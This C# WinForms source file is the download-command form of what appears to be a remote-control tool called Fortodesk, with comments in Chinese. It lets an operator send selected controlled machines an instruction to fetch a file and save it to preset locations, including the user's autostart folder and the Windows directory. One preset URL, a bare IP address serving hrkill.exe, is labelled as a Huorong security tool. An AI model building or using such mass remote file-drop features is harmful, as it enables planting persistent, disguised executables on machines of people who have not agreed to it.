using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
namespace Fortodesk
{
    public partial class DownloadForm : Form
    {
        // 路径标识符和显示名称的映射
        private static readonly string[] PathLabels = {
        "当前用户桌面",
        "当前用户主目录",
        "当前用户下载",
        "当前用户文档",
        "公共桌面",
        "公共用户目录",
        "公共下载",
        "公共文档",
        "当前用户开机自启动",
        "Windows系统目录",
    };
        private static readonly string[] PathIds = {
        "USER_DESKTOP",
        "USER_HOME",
        "USER_DOWNLOADS",
        "USER_DOCUMENTS",
        "PUBLIC_DESKTOP",
        "PUBLIC_HOME",
        "PUBLIC_DOWNLOADS",
        "PUBLIC_DOCUMENTS",
        "USER_STARTUP",
        "WINDOWS_DIR",
    };

        // ★ 常用下载地址的显示名称和真实 URL 映射
        private static readonly string[] UrlLabels = {
        "火绒专杀",
        "360急救箱",
        "360杀毒64位",
    };
        private static readonly string[] UrlValues = {
        "http://103.52.153.5:7755/download/hrkill.exe",
        "https://dl.360safe.com/360c0mpkill_5.1.64.1289-0701.zip",
        "https://dl.360scdn.com/360sd/360sd_x64_plus_7.0.0.1070.exe",
    };

        public DownloadForm()
        {
            InitializeComponent();
            // 初始化ComboBox
            comboBox1.Items.Clear();
            comboBox1.Items.Add("-- 手动输入路径 --");
            foreach (var label in PathLabels)
                comboBox1.Items.Add(label);
            comboBox1.SelectedIndexChanged += ComboBox1_SelectedIndexChanged;
            comboBox1.SelectedIndex = 1; // ★ 默认选中"当前用户桌面"，触发填入 textBox2 并锁定

            // 初始化 comboBox2（常用下载地址），默认选中第一项并填入 textBox1
            comboBox2.Items.Clear();
            foreach (var label in UrlLabels)
                comboBox2.Items.Add(label);
            comboBox2.SelectedIndexChanged += ComboBox2_SelectedIndexChanged;
            comboBox2.SelectedIndex = 0; // 触发一次 SelectedIndexChanged，自动填入 textBox1
        }
        private void ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            int idx = comboBox1.SelectedIndex;
            if (idx <= 0)
            {
                textBox2.Clear();
                // 手动输入，不修改textBox2
                textBox2.ReadOnly = false;
                return;
            }
            // 填入路径标识符，被控端会自行解析成绝对路径
            textBox2.Text = PathIds[idx - 1];
            textBox2.ReadOnly = true; // 选了预设就锁定，防止误改
        }

        // ★ 选择常用下载地址后，自动填入 textBox1
        private void ComboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            int idx = comboBox2.SelectedIndex;
            if (idx < 0 || idx >= UrlValues.Length) return;
            textBox1.Text = UrlValues[idx];
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string urlInput = textBox1.Text.Trim();
            string savePath = textBox2.Text.Trim();

            if (string.IsNullOrEmpty(urlInput))
            {
                MessageBox.Show("请输入下载地址");
                return;
            }

            var selected = MainForm.mainform.objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0)
            {
                MessageBox.Show("请先在主窗口列表中选择被控端");
                return;
            }

            // 构造payload: savePath\nurlWithArgs
            string payload = savePath + "\n" + urlInput;
            byte[] data = Encoding.UTF8.GetBytes(payload);

            // ★ 遍历所有选中被控端，每台独立线程发送，支持多台同时下载
            foreach (var obj in selected)
            {
                var host = obj as MainForm.HostInfo;
                if (host == null) continue;
                MainForm.mainform.AppendLog($"[{host.HostName}] 发送下载指令: {urlInput}" +
                                    (string.IsNullOrEmpty(savePath) ? "" : $"  保存到: {savePath}"));
                MainForm.mainform.SendCmdToHost(host, MainForm.CMD_DOWNLOAD_EX, data);
            }
            this.Close();
        }
    }
}